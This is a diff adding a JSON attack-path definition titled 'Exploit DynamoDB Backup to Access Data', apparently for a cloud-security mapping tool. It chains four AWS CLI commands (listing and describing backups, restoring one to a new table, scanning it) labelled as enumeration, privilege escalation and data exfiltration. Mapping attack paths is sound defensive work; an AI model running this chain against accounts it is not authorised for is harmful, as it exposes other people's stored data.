@@ -1,0 +1,60 @@
+{
+    "title": "Exploit DynamoDB Backup to Access Data",
+    "icon": "https://img.icons8.com/?size=100&id=yhTsDHXiSGTY&format=png&color=000000",
+    "nodes": [
+        {
+            "id": 1,
+            "label": "Attacker",
+            "icon": "https://img.icons8.com/ios-filled/50/000000/hacker.png",
+            "details": {}
+        },
+        {
+            "id": 2,
+            "label": "List DynamoDB Backups",
+            "icon": "https://img.icons8.com/ios-filled/50/000000/list.png",
+            "details": {
+                "command": "aws dynamodb list-backups",
+                "description": "Lists all DynamoDB backups in the specified AWS account.",
+                "services": ["DynamoDB"],
+                "attack_types": ["Enumeration"],
+                "references": "https://docs.aws.amazon.com/cli/latest/reference/dynamodb/list-backups.html"
+            }
+        },
+        {
+            "id": 3,
+            "label": "Describe Backup",
+            "icon": "https://img.icons8.com/?size=100&id=11351&format=png&color=000000",
+            "details": {
+                "command": "aws dynamodb describe-backup --backup-arn <BackupArn>",
+                "description": "Describes the specified DynamoDB backup, including its configuration and permissions.",
+                "services": ["DynamoDB"],
+                "attack_types": ["Enumeration"],
+                "references": "https://docs.aws.amazon.com/cli/latest/reference/dynamodb/describe-backup.html"
+            }
+        },
+        {
+            "id": 4,
+            "label": "Restore Backup",
+            "icon": "https://img.icons8.com/?size=100&id=11351&format=png&color=000000",
+            "details": {
+                "command": "aws dynamodb restore-table-from-backup --target-table-name <NewTableName> --backup-arn <BackupArn>",
+                "description": "Restores the specified DynamoDB backup to a new table.",
+                "services": ["DynamoDB"],
+                "attack_types": ["Privilege Escalation"],
+                "references": "https://docs.aws.amazon.com/cli/latest/reference/dynamodb/restore-table-from-backup.html"
+            }
+        },
+        {
+            "id": 5,
+            "label": "Scan Restored Table",
+            "icon": "https://img.icons8.com/?size=100&id=N59uJqEz3Xz6&format=png&color=000000",
+            "details": {
+                "command": "aws dynamodb scan --table-name <NewTableName>",
+                "description": "Scans the restored DynamoDB table to read its data.",
+                "services": ["DynamoDB"],
+                "attack_types": ["Data Exfiltration"],
+                "references": "https://docs.aws.amazon.com/cli/latest/reference/dynamodb/scan.html"
+            }
+        }
+    ]
+}
